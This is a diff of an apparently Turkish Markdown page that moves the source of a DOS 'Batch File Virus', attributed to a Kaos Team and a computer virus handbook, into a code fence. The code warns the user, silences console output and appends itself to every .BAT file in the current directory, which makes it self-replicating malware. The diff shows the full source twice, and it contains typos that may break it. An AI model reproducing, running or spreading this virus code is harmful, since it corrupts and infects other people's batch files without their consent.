@@ -19,37 +19,39 @@
 
 ****KAOS TEAM (BFV) KAYNAK KODU****
 
-****echo The Batch Filr Virus (BFT.BAT)****
-****echo Osborne/McGraw-Hill \`\`Computer Virıs Handbook\`\` kitabından****
-****echo -Bu purogram, bilgisayar virislerinin nasıl çalıştıklarını ve****
-****echo bir bilgisayar virisinün ne kadar kolay oldugunu****
-****echo gostermektedir.****
-****echo -Bulunulan dizin:****
-****cd****
-****echo -****
-****echo UYARI! BU PROGRAM, BULUNULAN DİZİNDEKİ BÜTÜN .BAT DOSYALARINA****
-****echo BULAŞIR. BULAŞTIGI .BAT DOSYALARI DİGER .BAT DOSYALARINI DA ****
-****echo ETKİLER! BU PROGRAMI ÇALIŞTIRMAKLA BÜTÜN .BAT DOSYALARINIZI****
-****echo BOZABİLİRSİNİZ!****
-****echo -****
-****echo Lütfen bu programı çalıştırmadan önce bütün .BAT dosyalarınızı****
-****echoyedekleyiniz. Eger nasıl yedekleme yapılacagını bilmiyorsanız****
-****echo bu programı çalıştırmayın.****
-****echo -****
-****echo Yukardaki açıklamaları anladıysanız devam etmek için ****
-****echo herhangi bir tuşa; programdan çıkmak için ^C tuşlarına basınız.****
-****pause > nul****
-****cls****
-****echo Bulunulan dizin****
-****cd****
-****echo Dizindeki bütün .BAT dosyalarına bulaşıyorum...****
-****ctty nul****
-****for % %f in (\*.bat) do copy % % f + bfv.bat****
-****ctty con****
-****cls****
-****echo Bu dizindeki bütün .BAT dosyalarına Batch File Virüsü****
-****echo bulaşmıştır. Bu virüsü temizlemek için yedeklediginiz .BAT****
-****echo dosyalarını yerlerine kopyalayınız.****
+```bash
+echo The Batch Filr Virus (BFT.BAT)
+echo Osborne/McGraw-Hill ``Computer Virıs Handbook`` kitabından
+echo -Bu purogram, bilgisayar virislerinin nasıl çalıştıklarını ve
+echo bir bilgisayar virisinün ne kadar kolay oldugunu
+echo gostermektedir.
+echo -Bulunulan dizin:
+cd
+echo -
+echo UYARI! BU PROGRAM, BULUNULAN DİZİNDEKİ BÜTÜN .BAT DOSYALARINA
+echo BULAŞIR. BULAŞTIGI .BAT DOSYALARI DİGER .BAT DOSYALARINI DA 
+echo ETKİLER! BU PROGRAMI ÇALIŞTIRMAKLA BÜTÜN .BAT DOSYALARINIZI
+echo BOZABİLİRSİNİZ!
+echo -
+echo Lütfen bu programı çalıştırmadan önce bütün .BAT dosyalarınızı
+echoyedekleyiniz. Eger nasıl yedekleme yapılacagını bilmiyorsanız
+echo bu programı çalıştırmayın.
+echo -
+echo Yukardaki açıklamaları anladıysanız devam etmek için 
+echo herhangi bir tuşa; programdan çıkmak için ^C tuşlarına basınız.
+pause > nul
+cls
+echo Bulunulan dizin
+cd
+echo Dizindeki bütün .BAT dosyalarına bulaşıyorum...
+ctty nul
+for % %f in (*.bat) do copy % % f + bfv.bat
+ctty con
+cls
+echo Bu dizindeki bütün .BAT dosyalarına Batch File Virüsü
+echo bulaşmıştır. Bu virüsü temizlemek için yedeklediginiz .BAT
+echo dosyalarını yerlerine kopyalayınız.
+```
 
 ****Şimdi virüs çeşitlerini sıralıyacaz****
 
